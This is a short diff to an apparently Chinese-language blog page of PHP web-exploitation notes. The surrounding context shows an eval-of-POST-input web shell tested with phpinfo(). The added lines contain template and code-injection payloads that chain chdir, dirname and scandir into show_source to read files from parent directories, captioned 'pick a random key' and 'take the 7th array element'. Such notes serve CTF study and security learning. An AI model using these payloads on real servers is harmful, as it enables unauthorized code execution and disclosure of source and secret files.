@@ -284,6 +284,12 @@ eval(filter_input(INPUT_POST, test))
 ?&gt;
 </code></pre>
 <p>POST test:phpinfo();</p>
+<pre><code>{if show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))))))}{/if}
+随机取键值
+
+show_source(current(array_slice(scandir(dirname(chdir(dirname(dirname(getcwd()))))),7)))
+取数组第7个
+</code></pre>
 
           
           <p class="next-post">下一篇：
